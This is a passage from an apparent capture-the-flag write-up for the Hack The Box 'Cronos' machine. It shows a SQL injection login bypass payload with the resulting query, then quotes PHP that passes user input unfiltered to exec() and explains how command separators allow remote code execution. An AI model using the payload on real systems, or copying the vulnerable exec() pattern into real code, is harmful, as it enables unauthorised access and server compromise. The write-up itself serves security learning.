+<p>But what if table had multiple entries? We could have bypassed that check by sending <code>'or'1'='1' LIMIT 1;-- -</code> is the username field. The <code>LIMIT</code> parameter tells the database how many rows to send, you can even specify the offset where you want the database to start sending rows from by default it is 0 - &ldquo;LIMIT &lt; offset &gt;, &lt; count &gt;&rdquo; - <code>LIMIT 0,1</code>.</p>
+<p>Sending the more correct SQL injection would make the query look like below:</p>
+<pre  class="mc-prism hide language-text" ><code class="language-SQL">SELECT id FROM users WHERE username = ''or'1'='1' LIMIT 1;-- -' AND password = '';
+</code></pre>
+<h3 id="code-injection---remote-code-execution">Code Injection - Remote Code Execution</h3>
+<p>Let&rsquo;s take a look at the code below.</p>
+<pre  class="mc-prism hide language-text" ><code class="language-PHP">&lt;?php
+   include('session.php');
+
+if($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;) {
+        //print_r($_POST);
+        $command = $_POST['command'];
+        $host = $_POST['host'];
+        exec($command.' '.$host, $output, $return);
+        //print_r($output);
+}
+?&gt;
+</code></pre>
+<p><img src="/HackTheBox/htb-cronos/10_page_source.png" alt="Net Tools Page Source"></p>
+<p>It would take the command parameter from the POST request which was defined to be either &ldquo;ping&rdquo; or &ldquo;traceroute&rdquo;, then it would take the user input. It would then take the command value supplied and append the user input to the command and execute it.</p>
+<p>Since there are no protection mechanisms, the end user can potentially send in anything even command termination characters like <code>;</code> and send in anything and the server would execute it. Upon code inspection we now know that the malicious could have intercepted the request and send in any value in the command parameter too, although it is not necessary.</p>
+
+</article>
+</div>
+
+
+                
+                    <div class="content-margin">
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "n00bsec" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+                
+            </div>
+<footer>
+    <article>Made with love...and copious amounts of coffee</article>
+</footer>
+
+</main>
+    </body>
+</html>
